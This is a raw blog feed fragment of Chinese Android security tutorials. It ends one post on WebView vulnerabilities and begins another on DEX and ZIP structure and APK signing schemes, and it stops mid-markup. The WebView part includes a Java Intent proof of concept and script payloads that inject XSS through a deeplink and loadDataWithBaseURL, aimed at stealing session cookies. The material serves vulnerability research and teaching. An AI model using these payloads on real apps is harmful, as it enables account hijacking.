title="（2）XSS注入漏洞"></a>（2）XSS注入漏洞</h4><p><strong>漏洞原理：</strong></p><p>这也是我们结合Deeplink+WebView导致的一个漏洞问题，我们可以通过构造含深度调用链的JS，然后通过加载去实现XSS注入</p><p><strong>漏洞复现：</strong></p><p>首先我们查看样本的DeepLinks</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/62.png" alt="image-20220730130234190"></p><p>然后我们可以发现样本的代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/63.png" alt="image-20220730130256549"></p><p>我们构造攻击脚本：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/64.png" alt="image-20220730130336427"></p><p>然后我们通过去访问该html:</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/65.png" alt="image-20220730130416578"></p><p>接着我们使用目标样本打开：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/66.png" alt="image-20220730130442740"></p><p>即可以成功的进行XSS注入</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/67.png" alt="image-20220730130506890"></p><h4 id="（3）DeepLinks在WebView上的组合漏洞"><a href="#（3）DeepLinks在WebView上的组合漏洞" class="headerlink" title="（3）DeepLinks在WebView上的组合漏洞"></a>（3）DeepLinks在WebView上的组合漏洞</h4><p>我们前面分析了很多DeepLinks在WebView上的漏洞，我们还可以将这些漏洞组合使用，我在测试一款银行的样本中发现组合漏洞：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/68.png" alt="image-20220730130714437"></p><p>这个结合了前面我们讲的网络漏洞、路径穿越、XSS、WebView漏洞，具体的大家可以去听我在平安SRC&amp;&amp;看雪的沙龙会议中的演讲。</p><p>以及我在网上收集的一个大佬的文章，描述的漏洞利用流程，大家可以参考：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/76.png" alt="image-20220730141930818"></p><p>参考文章：<a href="http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/">APP漏洞利用组合拳——应用克隆案例分析</a></p><h4 id="（4）loadDataWithBaseURL漏洞"><a href="#（4）loadDataWithBaseURL漏洞" class="headerlink" title="（4）loadDataWithBaseURL漏洞"></a>（4）loadDataWithBaseURL漏洞</h4><p>当<code>loadDataWithBaseURL</code>的域名和内容同时可控是，可以构造任意域下的XSS</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">loadDataWithBaseURL</span> </span><br><span class="line"><span class="params">(String baseUrl,</span></span><br><span class="line"><span class="params">String data, </span></span><br><span class="line"><span class="params">String mimeType, </span></span><br><span class="line"><span class="params">String encoding,</span></span><br><span class="line"><span class="params">String historyUrl)</span></span><br></pre></td></tr></table></figure><p>除了明显的情况外，攻击者控制调用中的<code>baseUri</code>和参数<code>data</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webView.loadDataWithBaseURL(<span class="string">&quot;https://google.com/&quot;</span>,</span><br><span class="line">           <span class="string">&quot;&lt;script&gt;document.write(document.domain)&lt;/script&gt;&quot;</span>,</span><br><span class="line">           <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p><strong>漏洞原理：</strong></p><p>deeplink加载任意fragment，转化为WebView loadDataWithBaseURL漏洞</p><p><strong>漏洞复现：</strong></p><p>实现步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)victim-app://c/contact/2?fragmen_class=&lt;fragment&gt;可启动任意fragment，并可 通过Intent Extra传参</span><br><span class="line">(2)寻找到⼀个带WebView的Fragment：GoogleMapWebViewFragment</span><br><span class="line">(3)可污染loadDataWithBaseURL的前两个参数，构造victim.com域下的XSS</span><br><span class="line">webview.loadDataWithBaseURL(&quot;victim.com&quot;,&quot;google-map.html&quot;,&quot;text/html&quot;,...);</span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_VIEW); </span><br><span class="line">payload.setData(Uri.parse(<span class="string">&quot;victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment&quot;</span>)); </span><br><span class="line"><span class="type">Bundle</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>(); </span><br><span class="line">extra.putString(<span class="string">&quot;map_url&quot;</span>, <span class="string">&quot;\&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;script&gt;&quot;</span>); </span><br><span class="line">extra.putString(<span class="string">&quot;map_file_name&quot;</span>, <span class="string">&quot;google_map.html&quot;</span>); </span><br><span class="line">extra.putString(<span class="string">&quot;map_domain&quot;</span>, <span class="string">&quot;https://www.victim-app.com&quot;</span>); </span><br><span class="line">payload.putExtra(<span class="string">&quot;bundle&quot;</span>, extra); </span><br><span class="line">startActivity(payload);</span><br></pre></td></tr></table></figure><p>可以通过这个deeplink打开任意fragment的漏洞，实现可控任意域执行任意JS，实现盗取登陆态的用户cookie！</p><p>具体参考：<a href="https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA">Android中的特殊攻击面（二）——危险的deeplink</a></p><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文我编写了很久，主要是一些案例和网上的漏洞复现需要大量的时间去做，很多案例和攻击poc，我都进行了手动编写，一些网上已有的大佬的文章样例，我也进行了一一的复现，将一些不能复现的全部剔除，WebView漏洞是Android APP上当前十分重要的漏洞，漏洞的种类十分多，本文归纳了20多种类别的漏洞并进行了一一的复现，具体漏洞扩展，大家可以参考后面的文献，而实验的poc和攻击样本我也会上传知识星球和github。</p><p>github网址：<a href="https://github.com/WindXaa">WindXaa</a></p><h2 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h2><p>会议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020 看雪SDC  Android WebView安全攻防指南2020</span><br></pre></td></tr></table></figure><p>WebView的原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://ljd1996.github.io/2020/12/01/Android-WebView%E7%AC%94%E8%AE%B0/</span><br><span class="line">https://blog.csdn.net/carson_ho/article/details/64904691</span><br><span class="line">https://juejin.cn/post/6844903564737789965#heading-9</span><br><span class="line">https://www.cnblogs.com/linhaostudy/p/14617314.html</span><br><span class="line">https://mabin004.github.io/2018/06/11/Android-JsBridge/</span><br></pre></td></tr></table></figure><p>远程代码执行漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://cloud.tencent.com/developer/article/1394368</span><br><span class="line">https://blog.csdn.net/weixin_39190897/article/details/125107626</span><br></pre></td></tr></table></figure><p>WebView跨域漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://blogs.360.cn/post/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.html</span><br><span class="line">https://blog.csdn.net/qq_35993502/article/details/121371049</span><br><span class="line">https://bbs.pediy.com/thread-269849.htm</span><br><span class="line">https://forum.butian.net/share/1562</span><br></pre></td></tr></table></figure><p>URL配置漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/terminal/201407.html</span><br><span class="line">https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</span><br><span class="line">https://www.freebuf.com/articles/web/208868.html</span><br></pre></td></tr></table></figure><p>Intent Scheme绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://drops.xmd5.com/static/drops/papers-2893.html</span><br><span class="line">https://blog.csdn.net/l173864930/article/details/36951805</span><br></pre></td></tr></table></figure><p>Intent:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blogs.360.cn/post/launchanywhere-google-bug-7699048.html</span><br><span class="line">http://drops.xmd5.com/static/drops/papers-2893.html</span><br></pre></td></tr></table></figure><p>deeplink:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA?</span><br><span class="line">http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;快半个月没有更新文章了，最近不少朋友催更了，今天我们进入Android APP漏洞之战系列文章中的一个重要篇幅——WebView漏洞，我们都知道在当下App漏洞中，WebView漏洞的占比是十分巨大的，各种类型的漏洞问题层出不穷，这篇文章就带着大家一起揭开WebView漏洞神奇的面纱。&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（19）——插件化漏洞与解压缩漏洞详解</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0019/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0019/</id>
    <published>2023-02-14T01:07:19.000Z</published>
    <updated>2023-12-23T09:13:44.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>最近一直处于忙碌的状态，花了很长一段时间，抽出碎片时间才将这篇帖子写完，本文结合上文的动态加载文章一起学习，本文主要讲述Android中存在的插件化漏洞、签名机制漏洞、解压缩漏洞等，并对一些经典的漏洞进行了复现，本文的相关实验文件由于太多，后面都会上传到知识星球</p><span id="more"></span><p>本文第二节主要讲述Dex文件结构、Zip文件结构、Android签名机制</p><p>本文第三节主要讲述插件化漏洞和解压缩漏洞的安全场景</p><p>本文第四节主要对插件化漏洞进行讲述</p><p>本文第五节主要对解压缩漏洞进行讲述</p><p>本文第六节主要对Janus漏洞原理进行讲述</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><h3 id="1-Dex文件基本结构"><a href="#1-Dex文件基本结构" class="headerlink" title="1.Dex文件基本结构"></a>1.Dex文件基本结构</h3><p>dex文件是anroid虚拟机Dalik运行的一种文件，包含应用程序的全部操作指令以及运行时数据，下面我们看下.class文件和.dex文件的区别：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/2.png"></p><p>我们可以发现dex文件将原来每个文件都有的共有信息合成一体，从而减少了class的冗余</p><p>下面我们进一步详细看dex文件结构</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/3.png"></p><p>我们可以发现dex文件主要由3大部分组成，分别是：<code>文件头、索引区、数据区</code>。其中索引区主要包括字符串、类型、方法、域、方法的索引。数据区主要包括类的定义、数据区、链路数据区</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/4.png"></p><p>上面我们可以看出Dex文件由许多部分组成，其中Dex Header最为重要，因为Dex的其他组成部分，都需要通过Dex Header中的索引才能找到</p><h4 id="（1）Dex-Header"><a href="#（1）Dex-Header" class="headerlink" title="（1）Dex Header"></a>（1）Dex Header</h4><p>dex文件头一般固定为0x70个字节大小，包括标志、版本号、校验码、sha-1签名以及其他一些方法、类的数量和偏移地址等信息。如图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/5.png"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/6.png"></p><p>结合上面的两张图进行对照，下面我们进一步详细的描述dex文件的结构</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/7.png"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/8.png"></p><h4 id="（2）索引区"><a href="#（2）索引区" class="headerlink" title="（2）索引区"></a>（2）索引区</h4><p>dex文件索引区主要是对一些字符串、类型、方法、域、方法的索引，方法可以查找到对应的数据位置</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/9.png" alt="image-20220221104633099"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/10.png" alt="image-20220221103446888"></p><h4 id="（3）数据区"><a href="#（3）数据区" class="headerlink" title="（3）数据区"></a>（3）数据区</h4><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/11.png" alt="image-20220221105433209"></p><p>数据区一般包括类的定义区、数据区、链接数据区。类的定义区一般存放dex文件中一些类对象的声明，数据区则存放代码原数据，链接数据区一般提供从索引区到数据区的链接映射关系</p><h3 id="2-Zip文件结构"><a href="#2-Zip文件结构" class="headerlink" title="2. Zip文件结构"></a>2. Zip文件结构</h3><p>zip文件是比较常见的压缩文件，我们先来看一下zip文件的基本结构图：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/12.png" alt="image-20220221111055116"></p><p>通过图中我们可以看出，zip文件一般分为三个部分：源文件数据存储区、中心目录区、中心目录结束标识</p><h4 id="（1）源文件数据存储区"><a href="#（1）源文件数据存储区" class="headerlink" title="（1）源文件数据存储区"></a>（1）源文件数据存储区</h4><p>记录着压缩的所有文件的内容信息，其数据组织结构是每个文件都由local file header、file data、data descriptor三部分组成</p><h5 id="lt-1-gt-file-header"><a href="#lt-1-gt-file-header" class="headerlink" title="&lt;1&gt; file header"></a>&lt;1&gt; file header</h5><p>用于标识文件的开始，文件结构如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/13.png" alt="image-20220221111755433"></p><h5 id="lt-2-gt-file-data"><a href="#lt-2-gt-file-data" class="headerlink" title="&lt;2&gt;file data"></a>&lt;2&gt;file data</h5><p>主要存放相应的压缩文件的源数据</p><h5 id="lt-3-gt-data-descriptor"><a href="#lt-3-gt-data-descriptor" class="headerlink" title="&lt;3&gt;data descriptor"></a>&lt;3&gt;data descriptor</h5><p>一般用于标识该文件压缩结束，该结构只有在相应的header中通用标记字段的第３位设为１时才会出现，紧接在压缩文件源数据后。这个数据描述符只用在不能对输出的 ZIP 文件进行检索时使用。例如：在一个不能检索的驱动器（如：磁带机上）上的 ZIP 文件中。如果是磁盘上的ZIP文件一般没有这个数据描述符。</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/14.png" alt="image-20220221112109956"></p><h4 id="（2）中心目录区"><a href="#（2）中心目录区" class="headerlink" title="（2）中心目录区"></a>（2）中心目录区</h4><p>对于待压缩的目录而言，每一个子目录对应一个压缩目录源数据，记录该目录的描述信息。压缩包中所有目录源数据连续存储在整个归档包的最后，这样便于向包中追加新的文件。头部的结构如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/15.png" alt="image-20220221112226588"></p><h4 id="（3）中心目录结束标识"><a href="#（3）中心目录结束标识" class="headerlink" title="（3）中心目录结束标识"></a>（3）中心目录结束标识</h4><p>目录结束标识存在于整个归档包的结尾，用于标记压缩的目录数据的结束，结构如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/16.png" alt="image-20220221112404675"></p><h3 id="3-Android-APK签名机制"><a href="#3-Android-APK签名机制" class="headerlink" title="3.Android APK签名机制"></a>3.Android APK签名机制</h3><p>应用签名主要是避免外部恶意解压、破解或者反编译修改内容，签名的本质是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">认证：Android 平台上运行的每个应用都必须有开发者的签名。在安装应用时，软件包管理器会验证 APK 是否已经过适当签名，安装程序会拒绝没有获得签名就尝试安装应用</span><br><span class="line">验证完整性：软件包管理器在安装应用前会验证应用摘要，如果破解者修改了 apk 里的内容，那么摘要就不再匹配，验证失败</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/17.png" alt="image-20220221141751025"></p><h4 id="（1）应用签名方案类型"><a href="#（1）应用签名方案类型" class="headerlink" title="（1）应用签名方案类型"></a>（1）应用签名方案类型</h4><p>截止到Android12，Android支持三种应用签名方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1:基于jar签名</span><br><span class="line">v2:提高验证性能&amp;覆盖范围（Android 7.0 Nougat引入）</span><br><span class="line">v3:支持密钥轮换（Android 9.0 Pie引入）</span><br></pre></td></tr></table></figure><p>为了提高兼容性，必须按照v1,v2,v3的先后顺序采用签名方案，低版本平台会忽略高版本的签名方案在APK中添加额外数据，具体流程图如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/18.png" alt="image-20220221141751025"></p><h5 id="lt-1-gt-签名方案v1"><a href="#lt-1-gt-签名方案v1" class="headerlink" title="&lt;1&gt;签名方案v1"></a>&lt;1&gt;签名方案v1</h5><p>最基本的签名方案，是基于Jar的签名</p><p>v1签名后会增加META-INF文件夹，其中会有如下三个文件：</p><table><thead><tr><th>文件</th><th>描述</th></tr></thead><tbody><tr><td><strong>「MANIFEST.MF」</strong></td><td>记录「apk 中每一个文件对应的摘要」（除了 META-INF 文件夹）</td></tr><tr><td><strong>「*.SF」</strong></td><td>记录「MANIFEST.MF 文件的摘要」和「MANIFEST.MF 中每个数据块的摘要」</td></tr><tr><td><strong>「*.RSA」</strong></td><td>包含了「*.SF 文件的签名」和「包含公钥的开发者证书」</td></tr></tbody></table><p>v1签名流程：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/19.png" alt="image-20220221142628252"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）计算每个文件的 SHA-<span class="number">1</span> 摘要，进行 BASE64 编码后写入摘要文件，即 MANIFEST.MF 文件；</span><br><span class="line">（<span class="number">2</span>）计算整个 MANIFEST.MF 文件的 SHA-<span class="number">1</span> 摘要，进行 BASE64 编码后写入签名文件，即*.SF 文件；</span><br><span class="line">（<span class="number">3</span>）计算 MANIFEST.MF 文件中每一块摘要的 SHA-<span class="number">1</span> 摘要，进行 BASE64 编码后写入 签名文件，即*.SF 文件；</span><br><span class="line">（<span class="number">4</span>）计算整个 *.SF 文件的数字签名（先摘要再私钥加密）；</span><br><span class="line">（<span class="number">5</span>）将数字签名和 X<span class="number">.509</span> 开发者数字证书（公钥）写入 *.RSA 文件；</span><br></pre></td></tr></table></figure><p>验证流程：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/20.png" alt="image-20220221143020002"></p><p>主要包括验证签名、校验完整性两个步骤：</p><p>步骤1：验证签名步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）取出*.RSA 中包含的开发者证书，并校验其合法性</span><br><span class="line">（2）用证书中的公钥解密*.RSA中包含的签名</span><br><span class="line">（3）用证书中的公钥计算*.SF的签名</span><br><span class="line">（4）对比（2）和（3）的签名是否一致</span><br></pre></td></tr></table></figure><p>步骤2：验证完整性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）检查 APK 中包含的所有文件，对应的摘要值与 MANIFEST.MF 文件中记录的值一致</span><br><span class="line">（<span class="number">2</span>）使用证书文件（RSA 文件）检验签名文件（SF 文件）没有被修改过</span><br><span class="line">（<span class="number">3</span>）使用签名文件（SF 文件）检验 MF 文件没有被修改过</span><br></pre></td></tr></table></figure><p>上面任何一个步骤验证失败，则整个APK验证失败</p><p>问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">覆盖范围不足：Zip 文件中部分内容不在验证范围，例如 META-INF 文件夹；</span><br><span class="line">验证性能差：验证程序必须解压所有压缩的条目，这需要花费更多时间和内存</span><br><span class="line">存在Janus漏洞：恶意开发人员可以通过Janus漏洞去绕过Android 的v1签名验证机制</span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-签名方案v2"><a href="#lt-2-gt-签名方案v2" class="headerlink" title="&lt;2&gt;签名方案v2"></a>&lt;2&gt;签名方案v2</h5><p>Android7.0 中开始引入了APK签名方案v2，一种全文件签名方案，该方案能够发现对APK的受保护部分进行所有更改，相比v1来说校验速度更快，覆盖的范围也更广。但是考虑到版本兼容的问题，所以一般常见了v1+v2的混合签名模式</p><p>我们由上文知道Zip文件主体分为：<code>源文件数据存储区、中心目录区、中心目录结束标识</code>。EoCD中记录了中央目录的起始位置，在<code>源文件数据存储区</code>和<code>中心目录区</code>插入其他数据不会影响Zip的解压</p><p>因此v2签名后会在<code>源文件数据存储区</code>和<code>中心目录区</code>插入APK 签名分块（APK Signing Block）</p><p>如下图所示。从左到右边，我们定义为区块 1~4</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/21.png" alt="image-20220221151257690"></p><p>v2签名块（APK Signing Block）本身又主要分成三部分:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SignerData（签名者数据）：主要包括签名者的证书，整个APK完整性校验hash，以及一些必要信息</span><br><span class="line">Signature（签名）：开发者对SignerData部分数据的签名数据</span><br><span class="line">PublicKey（公钥）：用于验签的公钥数据</span><br></pre></td></tr></table></figure><p><strong>签名流程：</strong></p><p>​相比v1签名方案，v2签名方案不再以文件为单位计算摘要，而是以1MB为单位将文件拆分为多个连续的快（chunk），每个分区的最后一个快可能会小于1MB。v2签名流程如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/22.png" alt="image-20220221151319198"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）对区块 <span class="number">1</span>、<span class="number">3</span>、<span class="number">4</span>，按照 1MB 大小分割为多个块（chunk）</span><br><span class="line">（<span class="number">2</span>）计算每个块的摘要</span><br><span class="line">（<span class="number">3</span>）计算（<span class="number">2</span>）中所有摘要的签名</span><br><span class="line">（<span class="number">4</span>）添加X<span class="number">.509</span>开发者数字证书（公钥）</span><br></pre></td></tr></table></figure><p><strong>验证流程：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/23.png" alt="image-20220221151544009"></p><p>因为v2签名机制是在Android 7.0上版本才支持，因此对于Android 7.0以及以上版本，在安装过程中，如果v2 签名块，则必须走 v2 签名机制，不能绕过。否则降级走 v1 签名机制</p><p>v1 和 v2 签名机制是可以同时存在的，其中对于 v1 和 v2 版本同时存在的时候，v1 版本的 META_INF 的 <code>.SF</code> 文件属性当中有一个 <code>X-Android-APK-Signed</code> 属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Android-APK-Signed: 2</span><br></pre></td></tr></table></figure><p>v2签名本身的验证过程：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/24.png" alt="image-20220221152811530"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）利用PublicKey解密Signature，得到SignerData的hash明文</span><br><span class="line">（2）计算SignerData的hash值</span><br><span class="line">（3）两个值进行比较，如果相同则认为APK没有被修改过，解析出SignerData中的证书。否则安装失败</span><br><span class="line">（4）如果是第一次安装，直接将证书保存在应用信息中</span><br><span class="line">（5）如果是更新安装，即设备中原来存在这个应用，验证之前的证书是否与本次解析的证书相同。若相同，则安装成功，否则失败</span><br></pre></td></tr></table></figure><h5 id="lt-3-gt-签名方案v3"><a href="#lt-3-gt-签名方案v3" class="headerlink" title="&lt;3&gt;签名方案v3"></a>&lt;3&gt;签名方案v3</h5><p>Android 9.0中引入了新的签名方式v3，v3签名在v2的基础上，仍然采用检查整个压缩包的校验方式。不同的是在签名部分增可以添加新的证书（Attr块）。在这个新块中，会记录我们之前的签名信息以及新的签名信息， 支持密钥轮换，即以密钥转轮的方案，来做签名的替换和升级。这意味着，只要旧签名证书在手，应用能够在 APK 更新过程中更改其签名密钥。</p><p>v3 签名新增的新块（attr）存储了所有的签名信息，由更小的 Level 块，以链表的形式存储。</p><p><strong>签名流程：</strong></p><p>v3版本签名块也分成同样的三部分，与v2不同的是在SignerData部分，v3新增了attr块，其中是由更小的level块组成。每个level块中可以存储一个证书信息。前一个level块证书验证下一个level证书，以此类推。最后一个level块的证书，要符合SignerData中本身的证书，即用来签名整个APK的公钥所属于的证书。从v2到v3的过渡：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/25.png" alt="image-20220221153113453"></p><p><strong>签名校验：</strong></p><p>Android 的签名方案的升级都需要确保向下兼容。因此，在引入 v3 方案后会根据 APK 签名方案，v3 -&gt; v2 -&gt; v1 依次尝试验证 APK。而较旧的平台会忽略 v3 签名并尝试 v2 签名，最后才去验证 v1 签名。如下图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/26.png" alt="image-20220221152048634"></p><p>注意：对于覆盖安装的情况，签名校验只支持升级而不支持降级。即一个使用 V1 签名的 Apk，可以使用 V2 签名的 Apk 进行覆盖安装，反之则不允许</p><p>v3签名自身的校验：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/27.png" alt="image-20220221153432708"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）利用PublicKey解密Signature，得到SignerData的hash明文</span><br><span class="line">（<span class="number">2</span>）计算SignerData的hash值</span><br><span class="line">（<span class="number">3</span>）两个值进行比较，如果相同则认为APK没有被修改过，解析出SignerData中的证书。否则安装失败</span><br><span class="line">（<span class="number">4</span>）逐个解析出level块证书并验证，并保存为这个应用的历史证书</span><br><span class="line">（<span class="number">5</span>）如果是第一次安装，直接将证书与历史证书一并保存在应用信息中</span><br><span class="line">（<span class="number">6</span>）如果是更新安装，验证之前的证书与历史证书，是否与本次解析的证书或者历史证书中存在相同的证书，其中任意一个证书符合即可安装</span><br></pre></td></tr></table></figure><h5 id="lt-4-gt-三种签名的比较和校验时机"><a href="#lt-4-gt-三种签名的比较和校验时机" class="headerlink" title="&lt;4&gt;三种签名的比较和校验时机"></a>&lt;4&gt;三种签名的比较和校验时机</h5><p>v2、v3的比较如下图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/28.png" alt="image-20220221153432708"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1签名方案：基于 Jar 的签名方案，但存在的问题：完整性覆盖范围不足 &amp; 验证性能差</span><br><span class="line">v2签名方案：通过条目内容区、中央目录区之间插入APK 签名分块（APK Signing Block）对v1签名进行了优化</span><br><span class="line">v3签名方案：支持密钥轮换，新增的新块（attr）存储了所有的签名信息，对v2签名进行了优化</span><br></pre></td></tr></table></figure><p>验证签名的时机主要要了解Android安装应用的方式：</p><figure class="highlight 